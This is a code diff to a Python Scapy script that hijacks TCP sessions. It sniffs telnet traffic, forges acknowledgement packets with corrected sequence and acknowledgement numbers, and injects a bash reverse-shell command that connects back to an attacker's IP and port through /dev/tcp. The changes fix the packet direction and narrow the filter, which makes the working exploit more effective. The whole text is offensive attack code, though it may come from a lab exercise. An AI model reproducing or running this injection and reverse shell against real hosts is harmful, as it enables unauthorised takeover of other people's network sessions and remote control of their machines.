@@ -17,16 +17,17 @@ REVERSE_SHELL = f"\r/bin/bash -i > /dev/tcp/{attacker_ip}/{attacker_port} 0<&1 2
 def automatic_hijacking():
     print("*** Hijacking Automatic Mode ***")
     print('[+] Sniffing...')
-    sniff(iface=IFACE, filter='tcp', prn=_hijacking)
+    sniff(iface=IFACE, filter='tcp and src port 23', prn=_hijacking)
 
 
 def _hijacking(pkt):
+    pkt.show()
     if pkt[IP].dst == victim_ip and Raw in pkt:
         tcp_seg_len = len(pkt.getlayer(Raw).load)
 
-        ip = IP(src=pkt[IP].src, dst=pkt[IP].dst)
-        tcp = TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport, flags="A",
-                  seq=pkt[TCP].seq+tcp_seg_len, ack=pkt[TCP].ack+tcp_seg_len)
+        ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
+        tcp = TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, flags="A",
+                  seq=pkt[TCP].ack+tcp_seg_len, ack=pkt[TCP].seq+tcp_seg_len)
         data = REVERSE_SHELL 
         pkt = ip/tcp/data
         send(pkt, iface=IFACE, verbose=0)
